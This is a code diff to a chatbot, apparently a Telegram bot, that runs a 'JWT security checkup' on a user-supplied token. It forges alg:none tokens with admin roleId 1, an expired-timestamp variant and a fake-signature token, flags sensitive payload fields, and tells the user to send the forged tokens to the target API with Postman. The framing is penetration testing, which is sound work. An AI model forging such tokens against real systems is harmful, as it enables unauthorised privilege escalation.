@@ -1587,12 +1587,17 @@ export const startBot = async () => {
       const parts = token.split('.');
       if (parts.length !== 3) throw new Error("Token 格式异常");
 
+      // 解析原始 Header
+      let headerRaw = parts[0].replace(/-/g, '+').replace(/_/g, '/');
+      while (headerRaw.length % 4) headerRaw += '=';
+      const headerData = JSON.parse(Buffer.from(headerRaw, 'base64').toString('utf-8'));
+      const originalAlg = headerData.alg || "未知";
+
       // 1. 构造 None 算法 Header (alg: none)
-      const header = { alg: "none", typ: "JWT" };
-      const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+      const headerNone = { alg: "none", typ: "JWT" };
+      const headerNoneB64 = Buffer.from(JSON.stringify(headerNone)).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
 
       // 2. 解析原始 Payload
-      // 处理 Base64Url padding
       let payloadRaw = parts[1].replace(/-/g, '+').replace(/_/g, '/');
       while (payloadRaw.length % 4) payloadRaw += '=';
       const payloadJson = Buffer.from(payloadRaw, 'base64').toString('utf-8');
@@ -1606,26 +1611,43 @@ export const startBot = async () => {
         expDate = new Date(originalExp * 1000).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
       }
 
-      // PoC 1: 提权为超级管理员
+      // PoC 1: None算法提权为超级管理员
       const payloadAdmin = { ...payloadData, roleId: "1" };
       const payloadAdminB64 = Buffer.from(JSON.stringify(payloadAdmin)).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
-      const forgedAdminToken = `${headerB64}.${payloadAdminB64}.`;
+      const forgedAdminToken = `${headerNoneB64}.${payloadAdminB64}.`;
 
       // PoC 2: 伪造已过期 (将 exp 设置为 2000年1月1日)
       const payloadExpired = { ...payloadData, roleId: "1", exp: 946656000 };
       const payloadExpiredB64 = Buffer.from(JSON.stringify(payloadExpired)).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
-      const forgedExpiredToken = `${headerB64}.${payloadExpiredB64}.`;
+      const forgedExpiredToken = `${headerNoneB64}.${payloadExpiredB64}.`;
 
-      const replyMsg = `🛡️ **JWT 安全体检 (None 算法 & 过期校验漏洞)**\n\n` +
-        `🤖 机器人已为你生成用于渗透测试的 **2个伪造 Token (PoC)**。\n` +
-        `⚠️ *基于安全红线准则，已拦截自动化攻击发包。*\n\n` +
-        `🔍 **基础信息**: 当前角色 \`${originalRoleId}\` | 原过期时间: \`${expDate}\`\n\n` +
-        `💣 **PoC 1: 越权漏洞 Token (roleId: 1)**\n\`\`\`\n${forgedAdminToken}\n\`\`\`\n\n` +
-        `💣 **PoC 2: 过期失效漏洞 Token (exp: 2000年)**\n\`\`\`\n${forgedExpiredToken}\n\`\`\`\n\n` +
-        `**测试指南 (在 Postman 中使用)**\n` +
-        `1. 发送 **PoC 1**：若返回 200 并吐出全量数据，说明 **None算法越权漏洞** 存在！\n` +
-        `2. 发送 **PoC 2**：若仍返回 200，说明系统 **不仅没验签名，连过期时间(exp)都不查**，Token 终生有效，属于严重漏洞连环套！\n` +
-        `若报 401/403，则说明对应防御正常。`;
+      // PoC 3: 未校验签名 (保留原算法 HS256 + 假签名)
+      const forgedFakeSigToken = `${parts[0]}.${payloadAdminB64}.fake_invalid_signature_for_testing`;
+
+      // 静态分析 4: 敏感信息泄露
+      const sensitiveKeys = ['phone', 'email', 'password', 'idcard', 'address', 'tel', 'mobile'];
+      const leakedInfo = Object.keys(payloadData).filter(k => sensitiveKeys.includes(k.toLowerCase()));
+      const leakReport = leakedInfo.length > 0 
+        ? `⚠️ **警告**：发现高危敏感字段 \`${leakedInfo.join(', ')}\`！JWT默认明文，极易泄露隐私。` 
+        : `✅ 安全：未发现常见的明文隐私字段。`;
+
+      // 静态分析 5: 算法混淆漏洞 (RS256 -> HS256)
+      const algConfusionReport = originalAlg.toUpperCase() === 'HS256'
+        ? `✅ 安全：当前系统使用 \`${originalAlg}\` 对称加密，先天免疫该漏洞。`
+        : `⚠️ **警告**：当前使用 \`${originalAlg}\` 非对称加密。请通知安全团队测试此漏洞！`;
+
+      const replyMsg = `🛡️ **JWT 全面安全体检报告**\n\n` +
+        `🔍 **基础信息**: 角色 \`${originalRoleId}\` | 算法: \`${originalAlg}\`\n` +
+        `📅 **过期时间**: \`${expDate}\`\n\n` +
+        `==== 📊 静态代码扫描 ====\n` +
+        `**[4] 敏感信息泄露扫描**: \n${leakReport}\n\n` +
+        `**[5] 算法混淆(RS256变HS256)扫描**: \n${algConfusionReport}\n\n` +
+        `==== 💣 动态渗透测试 (PoC) ====\n` +
+        `🤖 *已生成以下测试 Token，请在 Postman 中对接口进行请求。若返回 200 即证明存在该漏洞！*\n\n` +
+        `**[1] PoC 1: None 算法越权 (roleId: 1)**\n\`\`\`\n${forgedAdminToken}\n\`\`\`\n\n` +
+        `**[2] PoC 2: 过期时间(exp)未校验漏洞**\n\`\`\`\n${forgedExpiredToken}\n\`\`\`\n\n` +
+        `**[3] PoC 3: 未校验签名(瞎子保安)漏洞**\n\`\`\`\n${forgedFakeSigToken}\n\`\`\`\n\n` +
+        `💡 拿着这份体检报告去和开发团队交涉吧！`;
 
       await bot.sendMessage(msg.chat.id, replyMsg, { parse_mode: 'Markdown' });
     } catch (e: any) {
